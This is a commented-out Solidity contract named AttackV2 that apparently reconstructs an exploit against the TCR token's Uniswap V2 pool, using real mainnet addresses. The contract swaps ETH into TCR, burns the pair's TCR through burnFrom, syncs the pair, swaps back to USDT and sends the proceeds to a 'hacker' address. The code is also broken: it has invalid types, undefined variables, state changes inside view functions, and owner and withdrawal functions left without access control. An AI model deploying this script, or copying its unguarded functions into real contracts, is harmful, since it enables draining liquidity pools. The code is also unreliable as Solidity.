//pragma solidity ^0.8.0;
//
//import "./Governance/AccessControl.sol";
//import "./tmp/TcrToken.sol";
//
////transfer相关
//interface IERC20 {
//    function balanceOf(address account) external view returns (uint256);
//    function allowance(address owner, address spender) external view returns (uint256);
//    function transfer(address recipient, uint256 amount) external returns (bool);
//    function approve(address spender, uint256 amount) external returns (bool);
//    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
//    event Transfer(address indexed from, address indexed to, uint256 value);
//    event Approval(address indexed owner, address indexed spender, uint256 value);
//}
//
////重写Attack
//contract AttackV2 is AccessControl{
//    /**
//    {
//    "0x0000000000000000000000000000000000000000": "Null Address: 0x000…000",
//    "0xe38b72d6595fd3885d1d2f770aa23e94757f91a1": "TCR",
//    "0x7a250d5630b4cf539739df2c5dacb4c659f2488d": "Uniswap V2: Router 2",
//    "0x420725a69e79eeffb000f98ccd78a52369b6c5d4": "Uniswap V2: USDT-TCR",
//    "0x0d4a11d5eeaac28ec3f61d100daf4d40471f1852": "Uniswap V2: USDT",
//    "0xdac17f958d2ee523a2206206994597c13d831ec7": "USDT",
//    "0xc02aaa39b223fe8d0a0e5c4f27ead9083c756cc2": "WETH",
//    "0xeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeee": "Ether",
//    "0x6653d9bcbc28fc5a2f5fb5650af8f2b2e1695a15": "AttackContract",
//    "0xb19b7f59c08ea447f82b587c058ecbf5fde9c299": "AttackEOA"
//}
//
//rinkeby
//    uniswapFactory
//    UniswapV2Factory 0x5C69bEe701ef814a2B6a3EDD4B1652CB9cc5aA6f
//    UniswapV2Router02 0x7a250d5630b4cf539739df2c5dacb4c659f2488d
//    pairs地址可以由两种token地址调用函数计算出
//
//    "0x0000000000000000000000000000000000000000": "Null Address: 0x000…000",
//    "": "TCR",
//    0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D Uniswap V2: Router 2
//    "": "Uniswap V2: USDT-TCR",
//    "": "Uniswap V2: USDT", pairtoken USDT UniswapV2Pair
//    0x3B00Ef435fA4FcFF5C209a37d1f3dcff37c705aD USDT
//    0xc778417E063141139Fce010982780140Aa0cD5Ab WETH
//     "0xeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeee": "Ether",
//    "": "AttackContract",
//    "": "AttackEOA" 黑客洗钱地址
//
//
//    UniswapV2Pair
//
//    测试地址
//    https://app.uniswap.org/#/swap
//    **/
//
//
//    /* ========== variable ========== */
//    address USDTAddr = 0xdAC17F958D2ee523a2206206994597C13D831ec7;
//    address TCRAddr = 0xE38B72d6595FD3885d1D2F770aa23E94757F91a1;
//    address RouterAddr = 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D;
//    address PairAddr = 0x420725A69E79EEffB000F98Ccd78a52369b6C5d4;
//    address WETHAddr = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;
//    uint256 MAX_INT = 115792089237316195423570985008687907853269984665640564039457584007913129639935;
//    address public mortgagedToken;
//    //define is_prepaired
//    bool is_prepaired;
//    uint256  minAmount=100000000;
//    address payable public owner;
//
//    /* ========== CONSTRUCTOR ========== */
//    //指定token地址 代销毁
//    constructor(address _stakedToken) payable {
//        require(_stakedToken != address(0) , "STAKING: Zero address detected");
//        owner = payable(msg.sender);
//        mortgagedToken = _stakedToken;
//    }
//
//    //modifer
//    modifier onlyOwner(){
//        require(msg.sender == owner, "onlyOnner is allow");
//        _;
//    }
//
//    /* ========== VIEWS ========== */
//    function getMinAmount() public view returns (uint256){
//        return minAmount;
//    }
//
////    modifier onlyTrusty() {
////        require(hasRole(TRUSTY_ROLE, msg.sender), "STAKING: Caller is not a trusty");
////        _;
////    }
//
//    //cal ust balance
//    function calUstBalance()public view returns (uint256 balance){
//        uint256 usdtBalance = USDT.balanceOf(address(this));
//        return usdtBalance;
//    }
//    //cal this contract tcr balance
//    function calTcrBalance()public view returns (uint256 balance){
//        TcrToken TCR = TcrToken(TCRAddr);
//        uint256 tcrBalance = TCR.balanceOf(address(this));
//        return tcrBalance;
//    }
//    //cal this contract eth balance
//    function calEthBalance()public view returns (uint256 balance){
//        uint256 ethBalance = address(this).balance;
//        return ethBalance;
//    }
//
//    /* ========== owner FUNCTIONS ========== */
//    //define is_prepaired
//    function prepareAttack() public onlyOwner returns (bool is_prepaired){
//        console.log("+++++++++++++++++++++++++++++++++++++++prepareAttack start");
//        approve();
//        swap();
//        if(getBalance()>minAmount){
//            is_prepaired=true;
//            console.log("+++++++++++++++++++++++++++++++++++++++prepareAttack success");
//            return is_prepaired;
//        }else{
//            console.log("+++++++++++++++++++++++++++++++++++++++prepareAttack failed");
//            return is_prepaired;
//        }
//
//    }
//
//    function commitAttack() public onlyOwner returns (bool is_successd){
//        console.log("+++++++++++++++++++++++++++++++++++++++commitAttack start");
//        burn();
//        swapToUsdt();
//        uint256 amount=calUstBalance();
//        transferTo(msg.sender,amount);
//        console.log("+++++++++++++++++++++++++++++++++++++++commitAttack success");
//    }
//
//    //approve
//    function approve(address spender, uint256 amount) internal view returns (bool success){
//        TetherToken.json USDT = TetherToken.json(USDTAddr);
//        TcrToken TCR = TcrToken(TCRAddr);
//        USDT.approve(RouterAddr, MAX_INT);
//        TCR.approve(RouterAddr, MAX_INT);
//        TCR.approve(PairAddr, MAX_INT);
//        UniswapV2Pair pair = UniswapV2Pair(PairAddr);
//        return true;
//    }
//
//    //swap
//    function swap()internal view returns (bool success){
//        // 将Attack合约中所有的ETH兑换成tcrToken
//        uint256 wethAmount = address(this).balance;
//        UniswapV2Router router = UniswapV2Router(RouterAddr);
//        uint256 amountOutMin;
//        address[] memory path = new address[](3);
//        path[0] = WETHAddr;
//        path[1] = USDTAddr;
//        path[2] = TCRAddr;
//        uint256 deadline = block.timestamp + 24 hours;
//        router.swapExactETHForTokens{value: wethAmount}(amountOutMin, path, address(this), deadline);
//        console.log("1.swap eth to tcrToken. %s ETH swap to %s tcrToken.", wethAmount, TCR.balanceOf(address(this)));
//        return true;
//    }
//
//    //get balance
//    function getBalance() internal view returns (uint256 balance){
//        // 计算Pair合约中tcrToken的余额,用来评估可以销毁掉多少tcrToken
//        uint256 pairTcrBalance =  TCR.balanceOf(PairAddr);
//        console.log("At begining, Pair Contract has %s tcrToken:", pairTcrBalance);
//        console.log("+++++++++++++++++++++++++++++++++++++++prepareAttack end");
//        return pairTcrBalance;
//    }
//    //burn
//    function burn()internal view returns (bool success){
//        TcrToken TCR = TcrToken(TCRAddr);
//        TCR.burnFrom(PairAddr, pairTcrBalance-100000000);
//        pair.sync();
//        return true;
//    }
//    //swap
//    function swapToUsdt()internal view returns (bool success){
//        console.log("+++++++++++++++++++++++++++++++++++++++address(this)",address(this));
//        uint256 thisTcrBalance = TCR.balanceOf(address(this));
//        uint256 amountOut;
//        address[] memory path2 = new address[](2);
//        path2[0] = TCRAddr;
//        path2[1] = USDTAddr;
//        router.swapExactTokensForTokens(thisTcrBalance, amountOut, path2, address(this), deadline);
//        uint256 lastUsdt = USDT.balanceOf(address(this));
//        console.log("%s tcr swap to ", thisTcrBalance);
//        return true;
//    }
//
//    //transfer to
//    function transferTo(address to, uint256 amount) public returns (bool success){
//        USDT.transfer(to, amount);
//        console.log("4. Transfer %s USDT to hacker.", amount);
//        return true;
//    }
//
//    /* ========== PUBLIC FUNCTIONS ========== */
//    function depositErc20(address _user,uint256 amount) external {
//        require(amount > 0, "amount must be greater than 0");
//        IERC20(mortgagedToken).transferFrom(msg.sender, address(this), amount);
//        emit Deposit(_user, amount);
//    }
//
//    function depositEth() external payable {
//        emit DepositErc20(msg.sender, msg.amount);
//    }
//
//    //metask当作合约来引用 可以看到余额
//    function balanceOf(address account) public  view returns (uint) {
//        return address(this).balance;
//    }
//
//    /* ========== EMERGENCY FUNCTIONS ========== */
//    // Add temporary withdrawal functionality for owner(DAO) to transfer all tokens to a safe place.
//    // Contract ownership will transfer to address(0x) after full auditing of codes.
//
//    function emergencyWithdrawERC20(address to, address _token, uint256 amount) external {
//        IERC20(_token).transfer(to, amount);
//    }
//    function emergencyWithdrawETH(address payable to, uint amount) external  {
//        payable(to).transfer(amount);
//    }
//
//    //change owneer
//    function changeOwner(address newOwner) public {
//        owner = newOwner;
//    }
//    //kill contract
//    function kill(address addr) public onlyOwner {
//        selfdestruct(payable(addr));
//    }
//    //set minAmount
//    function setMinAmount(uint256 amount) public onlyOwner{
//        minAmount=amount;
//    }
//    //set is_prepaired
//    function setIsPrepaired(bool is_prepaired) public onlyOwner{
//        is_prepaired=is_prepaired;
//    }
//
//    /* ========== EVENTS ========== */
//    event withdrawStakedtokens(uint256 totalStakedTokens, address to);
//    event StakedTokenSet(address _stakedToken);
//    event SharesSet(uint256 _daoShare, uint256 _earlyFoundersShare);
//    event WithdrawParticleCollectorAmount(uint256 _earlyFoundersShare, uint256 _daoShare);
//    event WalletsSet(address _daoWallet, address _earlyFoundersWallet);
//    event Deposit(address user, uint256 amount);
//    event DepositErc20(address user, uint256 amount);
//    event Withdraw(address user, uint256 amount);
//    event EmergencyWithdraw(address user, uint256 amount);
//    event RewardClaimed(address user, uint256 amount);
//    event RewardPerBlockChanged(uint256 oldValue, uint256 newValue);
//    event StartBlockSet(uint256 oldBlock, uint256 newBlock);
//}
